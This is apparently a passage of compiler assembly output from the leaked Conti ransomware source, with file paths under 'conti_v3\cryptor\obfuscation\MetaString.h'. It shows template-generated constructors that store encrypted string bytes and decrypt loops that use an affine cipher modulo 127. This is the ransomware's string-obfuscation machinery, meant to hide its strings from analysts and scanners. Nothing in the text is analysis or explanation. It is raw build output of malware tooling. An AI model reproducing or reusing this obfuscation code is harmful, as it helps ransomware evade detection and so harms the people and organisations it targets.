  000ef	c6 41 3c 67	 mov	 BYTE PTR [rcx+60], 103	; 00000067H
  000f3	c6 41 3d 79	 mov	 BYTE PTR [rcx+61], 121	; 00000079H
  000f7	c6 41 3e 67	 mov	 BYTE PTR [rcx+62], 103	; 00000067H
  000fb	c6 41 3f 34	 mov	 BYTE PTR [rcx+63], 52	; 00000034H
  000ff	c6 41 40 67	 mov	 BYTE PTR [rcx+64], 103	; 00000067H
  00103	c6 41 41 6d	 mov	 BYTE PTR [rcx+65], 109	; 0000006dH
  00107	c6 41 42 67	 mov	 BYTE PTR [rcx+66], 103	; 00000067H
  0010b	c6 41 43 72	 mov	 BYTE PTR [rcx+67], 114	; 00000072H
  0010f	c6 41 44 67	 mov	 BYTE PTR [rcx+68], 103	; 00000067H
  00113	c6 41 45 52	 mov	 BYTE PTR [rcx+69], 82	; 00000052H
  00117	c6 41 46 67	 mov	 BYTE PTR [rcx+70], 103	; 00000067H
  0011b	c6 41 47 34	 mov	 BYTE PTR [rcx+71], 52	; 00000034H
  0011f	c6 41 48 67	 mov	 BYTE PTR [rcx+72], 103	; 00000067H
  00123	c6 41 49 41	 mov	 BYTE PTR [rcx+73], 65	; 00000041H
  00127	c6 41 4a 67	 mov	 BYTE PTR [rcx+74], 103	; 00000067H
  0012b	c6 41 4b 70	 mov	 BYTE PTR [rcx+75], 112	; 00000070H
  0012f	c6 41 4c 67	 mov	 BYTE PTR [rcx+76], 103	; 00000067H
  00133	c6 41 4d 70	 mov	 BYTE PTR [rcx+77], 112	; 00000070H
  00137	c6 41 4e 67	 mov	 BYTE PTR [rcx+78], 103	; 00000067H
  0013b	c6 41 4f 4b	 mov	 BYTE PTR [rcx+79], 75	; 0000004bH
  0013f	c6 41 50 67	 mov	 BYTE PTR [rcx+80], 103	; 00000067H

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  00143	c6 41 51 70	 mov	 BYTE PTR [rcx+81], 112	; 00000070H
  00147	c6 41 52 67	 mov	 BYTE PTR [rcx+82], 103	; 00000067H
  0014b	c6 41 53 20	 mov	 BYTE PTR [rcx+83], 32	; 00000020H
  0014f	c6 41 54 67	 mov	 BYTE PTR [rcx+84], 103	; 00000067H
  00153	c6 41 55 33	 mov	 BYTE PTR [rcx+85], 51	; 00000033H
  00157	c6 41 56 67	 mov	 BYTE PTR [rcx+86], 103	; 00000067H
  0015b	c6 41 57 20	 mov	 BYTE PTR [rcx+87], 32	; 00000020H
  0015f	c6 41 58 67	 mov	 BYTE PTR [rcx+88], 103	; 00000067H
  00163	c6 41 59 09	 mov	 BYTE PTR [rcx+89], 9
  00167	c6 41 5a 67	 mov	 BYTE PTR [rcx+90], 103	; 00000067H
  0016b	c6 41 5b 26	 mov	 BYTE PTR [rcx+91], 38	; 00000026H
  0016f	c6 41 5c 67	 mov	 BYTE PTR [rcx+92], 103	; 00000067H
  00173	c6 41 5d 16	 mov	 BYTE PTR [rcx+93], 22
  00177	c6 41 5e 67	 mov	 BYTE PTR [rcx+94], 103	; 00000067H
  0017b	c6 41 5f 67	 mov	 BYTE PTR [rcx+95], 103	; 00000067H
  0017f	c6 41 60 67	 mov	 BYTE PTR [rcx+96], 103	; 00000067H
  00183	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]

; 52   :     {
; 53   : 
; 54   :     }

  00187	48 8b c1	 mov	 rax, rcx
  0018a	c3		 ret	 0
??0?$MetaBuffer@$0GB@$0GH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<97,103,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >::MetaBuffer<97,103,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BD@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BD@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<19,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 67		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 38 00 00
	00		 mov	 r10d, 56		; 00000038H
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 42 00 00 00	 mov	 eax, 66			; 00000042H
  0002d	2b c1		 sub	 eax, ecx
  0002f	8d 0c 80	 lea	 ecx, DWORD PTR [rax+rax*4]

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00037	c1 e1 02	 shl	 ecx, 2

; 40   :     return (a % n + n) % n;

  0003a	f7 e9		 imul	 ecx
  0003c	03 d1		 add	 edx, ecx
  0003e	c1 fa 06	 sar	 edx, 6
  00041	8b c2		 mov	 eax, edx
  00043	c1 e8 1f	 shr	 eax, 31
  00046	03 d0		 add	 edx, eax
  00048	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004b	2b c8		 sub	 ecx, eax
  0004d	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00052	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00055	f7 e9		 imul	 ecx
  00057	03 d1		 add	 edx, ecx
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00068	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  0006c	49 83 ea 01	 sub	 r10, 1
  00070	75 ae		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00072	49 8b c0	 mov	 rax, r8
  00075	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BD@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<19,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BD@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0BD@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<19,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55> >::MetaBuffer<19,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 64	 mov	 BYTE PTR [rcx+1], 100	; 00000064H
  00007	c6 41 02 42	 mov	 BYTE PTR [rcx+2], 66	; 00000042H
  0000b	c6 41 03 50	 mov	 BYTE PTR [rcx+3], 80	; 00000050H
  0000f	c6 41 04 42	 mov	 BYTE PTR [rcx+4], 66	; 00000042H
  00013	c6 41 05 5c	 mov	 BYTE PTR [rcx+5], 92	; 0000005cH
  00017	c6 41 06 42	 mov	 BYTE PTR [rcx+6], 66	; 00000042H
  0001b	c6 41 07 6f	 mov	 BYTE PTR [rcx+7], 111	; 0000006fH
  0001f	c6 41 08 42	 mov	 BYTE PTR [rcx+8], 66	; 00000042H
  00023	c6 41 09 04	 mov	 BYTE PTR [rcx+9], 4
  00027	c6 41 0a 42	 mov	 BYTE PTR [rcx+10], 66	; 00000042H
  0002b	c6 41 0b 49	 mov	 BYTE PTR [rcx+11], 73	; 00000049H
  0002f	c6 41 0c 42	 mov	 BYTE PTR [rcx+12], 66	; 00000042H
  00033	c6 41 0d 6f	 mov	 BYTE PTR [rcx+13], 111	; 0000006fH
  00037	c6 41 0e 42	 mov	 BYTE PTR [rcx+14], 66	; 00000042H
  0003b	c6 41 0f 27	 mov	 BYTE PTR [rcx+15], 39	; 00000027H
  0003f	c6 41 10 42	 mov	 BYTE PTR [rcx+16], 66	; 00000042H
  00043	c6 41 11 69	 mov	 BYTE PTR [rcx+17], 105	; 00000069H
  00047	c6 41 12 42	 mov	 BYTE PTR [rcx+18], 66	; 00000042H
  0004b	c6 41 13 04	 mov	 BYTE PTR [rcx+19], 4
  0004f	c6 41 14 42	 mov	 BYTE PTR [rcx+20], 66	; 00000042H
  00053	c6 41 15 7c	 mov	 BYTE PTR [rcx+21], 124	; 0000007cH
  00057	c6 41 16 42	 mov	 BYTE PTR [rcx+22], 66	; 00000042H
  0005b	c6 41 17 04	 mov	 BYTE PTR [rcx+23], 4
  0005f	c6 41 18 42	 mov	 BYTE PTR [rcx+24], 66	; 00000042H
  00063	c6 41 19 76	 mov	 BYTE PTR [rcx+25], 118	; 00000076H
  00067	c6 41 1a 42	 mov	 BYTE PTR [rcx+26], 66	; 00000042H
  0006b	c6 41 1b 50	 mov	 BYTE PTR [rcx+27], 80	; 00000050H
  0006f	c6 41 1c 42	 mov	 BYTE PTR [rcx+28], 66	; 00000042H
  00073	c6 41 1d 49	 mov	 BYTE PTR [rcx+29], 73	; 00000049H
  00077	c6 41 1e 42	 mov	 BYTE PTR [rcx+30], 66	; 00000042H
  0007b	c6 41 1f 27	 mov	 BYTE PTR [rcx+31], 39	; 00000027H
  0007f	c6 41 20 42	 mov	 BYTE PTR [rcx+32], 66	; 00000042H
  00083	c6 41 21 7c	 mov	 BYTE PTR [rcx+33], 124	; 0000007cH
  00087	c6 41 22 42	 mov	 BYTE PTR [rcx+34], 66	; 00000042H
  0008b	c6 41 23 10	 mov	 BYTE PTR [rcx+35], 16
  0008f	c6 41 24 42	 mov	 BYTE PTR [rcx+36], 66	; 00000042H
  00093	c6 41 25 6f	 mov	 BYTE PTR [rcx+37], 111	; 0000006fH
  00097	c6 41 26 42	 mov	 BYTE PTR [rcx+38], 66	; 00000042H
  0009b	c6 41 27 27	 mov	 BYTE PTR [rcx+39], 39	; 00000027H
  0009f	c6 41 28 42	 mov	 BYTE PTR [rcx+40], 66	; 00000042H
  000a3	c6 41 29 56	 mov	 BYTE PTR [rcx+41], 86	; 00000056H
  000a7	c6 41 2a 42	 mov	 BYTE PTR [rcx+42], 66	; 00000042H
  000ab	c6 41 2b 10	 mov	 BYTE PTR [rcx+43], 16
  000af	c6 41 2c 42	 mov	 BYTE PTR [rcx+44], 66	; 00000042H
  000b3	c6 41 2d 04	 mov	 BYTE PTR [rcx+45], 4
  000b7	c6 41 2e 42	 mov	 BYTE PTR [rcx+46], 66	; 00000042H
  000bb	c6 41 2f 3d	 mov	 BYTE PTR [rcx+47], 61	; 0000003dH
  000bf	c6 41 30 42	 mov	 BYTE PTR [rcx+48], 66	; 00000042H
  000c3	c6 41 31 50	 mov	 BYTE PTR [rcx+49], 80	; 00000050H
  000c7	c6 41 32 42	 mov	 BYTE PTR [rcx+50], 66	; 00000042H
  000cb	c6 41 33 3d	 mov	 BYTE PTR [rcx+51], 61	; 0000003dH
  000cf	c6 41 34 42	 mov	 BYTE PTR [rcx+52], 66	; 00000042H
  000d3	c6 41 35 33	 mov	 BYTE PTR [rcx+53], 51	; 00000033H
  000d7	c6 41 36 42	 mov	 BYTE PTR [rcx+54], 66	; 00000042H
  000db	c6 41 37 42	 mov	 BYTE PTR [rcx+55], 66	; 00000042H
  000df	c6 41 38 42	 mov	 BYTE PTR [rcx+56], 66	; 00000042H
  000e3	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  000e7	48 8b c1	 mov	 rax, rcx
  000ea	c3		 ret	 0
??0?$MetaBuffer@$0BD@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<19,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55> >::MetaBuffer<19,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0ED@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0ED@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<67,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 67		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 39 00 00 00	 mov	 eax, 57			; 00000039H
  0002d	2b c1		 sub	 eax, ecx
  0002f	8d 0c c0	 lea	 ecx, DWORD PTR [rax+rax*8]

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00037	c1 e1 02	 shl	 ecx, 2

; 40   :     return (a % n + n) % n;

  0003a	f7 e9		 imul	 ecx
  0003c	03 d1		 add	 edx, ecx
  0003e	c1 fa 06	 sar	 edx, 6
  00041	8b c2		 mov	 eax, edx
  00043	c1 e8 1f	 shr	 eax, 31
  00046	03 d0		 add	 edx, eax
  00048	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004b	2b c8		 sub	 ecx, eax
  0004d	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00052	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00055	f7 e9		 imul	 ecx
  00057	03 d1		 add	 edx, ecx
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00068	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  0006c	49 83 ea 01	 sub	 r10, 1
  00070	75 ae		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00072	49 8b c0	 mov	 rax, r8
  00075	c3		 ret	 0
?decrypt@?$MetaBuffer@$0ED@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<67,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0ED@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0ED@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<67,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<67,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 5b	 mov	 BYTE PTR [rcx+1], 91	; 0000005bH
  00007	c6 41 02 39	 mov	 BYTE PTR [rcx+2], 57	; 00000039H
  0000b	c6 41 03 6b	 mov	 BYTE PTR [rcx+3], 107	; 0000006bH
  0000f	c6 41 04 39	 mov	 BYTE PTR [rcx+4], 57	; 00000039H
  00013	c6 41 05 0f	 mov	 BYTE PTR [rcx+5], 15
  00017	c6 41 06 39	 mov	 BYTE PTR [rcx+6], 57	; 00000039H
  0001b	c6 41 07 01	 mov	 BYTE PTR [rcx+7], 1
  0001f	c6 41 08 39	 mov	 BYTE PTR [rcx+8], 57	; 00000039H
  00023	c6 41 09 39	 mov	 BYTE PTR [rcx+9], 57	; 00000039H
  00027	c6 41 0a 39	 mov	 BYTE PTR [rcx+10], 57	; 00000039H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0ED@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<67,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<67,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EP@$0CC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0EP@$0CC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<79,34,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0c 00 00
	00		 mov	 r10d, 12
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 22 00 00 00	 mov	 eax, 34			; 00000022H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 2d	 imul	 ecx, eax, 45		; 0000002dH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EP@$0CC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<79,34,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0EP@$0CC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z
